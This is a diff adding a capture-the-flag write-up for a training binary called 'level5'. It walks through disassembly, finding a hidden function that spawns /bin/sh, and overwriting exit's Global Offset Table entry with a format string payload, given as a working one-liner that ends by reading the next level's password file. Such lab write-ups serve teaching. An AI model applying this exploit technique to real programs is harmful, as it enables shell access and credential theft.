@@ -1,0 +1,26 @@
+# As usual :
+info variable
+info functions
+objdump -d ./level5
+# We can see same variable m, o, n and main functions, let's disas
+disas main
+disas n
+disas o
+# Nothing interesting in main and n function
+# But we found a system call in o function
+x/s 0x80485f0
+# 0x80485f0:	 "/bin/sh"
+# We probably need to make that o function getting call somewhere so we can run the shell
+# After some research, I've found we can use Global Offset Table (which contain shared lib functions addresses) to replace call of exit by call of our o() function
+# For that we need to disas exit so we can have the address and replace it with o() address
+# let's convert to little endian with struct.pack as usual
+struct.pack("I", 0x8049838)
+# '8\x98\x04\x08'
+# Then we need to convert o() address in decimal so we can sub -4 octet as usual
+134513828 - 4 = 134513824
+# finally, let's use format string exploit with the cat trick
+(echo -e "8\x98\x04\x08%134513824x%4\$n"; cat) | ./level5
+# You have to wait then
+whoami
+#level6
+cat /home/user/level6/.pass
